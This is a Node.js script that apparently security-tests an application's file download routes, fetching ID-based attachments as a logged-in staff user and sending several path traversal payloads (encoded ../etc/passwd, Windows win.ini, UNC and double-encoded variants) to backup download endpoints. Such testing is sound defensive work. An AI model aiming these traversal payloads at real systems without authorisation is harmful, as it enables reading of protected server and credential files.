const { Jar, req, loginStaff, dump, getOrLoginStaff } = require('./sr-lib.cjs');

(async () => {
  const jar = new Jar();
  await getOrLoginStaff(jar);
  const out = {};

  const idBasedRoutes = [
    '/api/pdf-templates/1/background',
    '/api/damage-check-templates/1/background',
    '/api/transport-report-templates/1/background',
    '/api/vehicle-diagram-templates/1/image',
    '/api/fines/1/letter',
    '/api/drivers/1/license',
  ];
  for (const route of idBasedRoutes) {
    const r = await req(jar, 'GET', route);
    out[`GET ${route}`] = { status: r.status, contentType: r.headers.get('content-type'), bodyPreview: r.text.slice(0, 150) };
  }

  // Backups: traversal payloads on /api/backups/download/:type/:filename
  const traversalPayloads = [
    '..%2f..%2f..%2fetc%2fpasswd',
    '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..\\..\\..\\Windows\\win.ini',
    'C:\\Windows\\win.ini',
    '\\\\localhost\\c$\\Windows\\win.ini',
    '..%252f..%252fetc%252fpasswd', // double-encoded
  ];
  for (const p of traversalPayloads) {
    const r = await req(jar, 'GET', `/api/backups/download/database/${p}`);
    out[`GET /api/backups/download/database/${p}`] = { status: r.status, body: r.text.slice(0, 200) };
  }
  // also the single-segment variant
  for (const p of traversalPayloads) {
    const r = await req(jar, 'GET', `/api/backups/download/${p}`);
    out[`GET /api/backups/download/${p}`] = { status: r.status, body: r.text.slice(0, 200) };
  }

  console.log(dump(out));
})().catch(e => { console.error('FATAL', e); process.exit(1); });
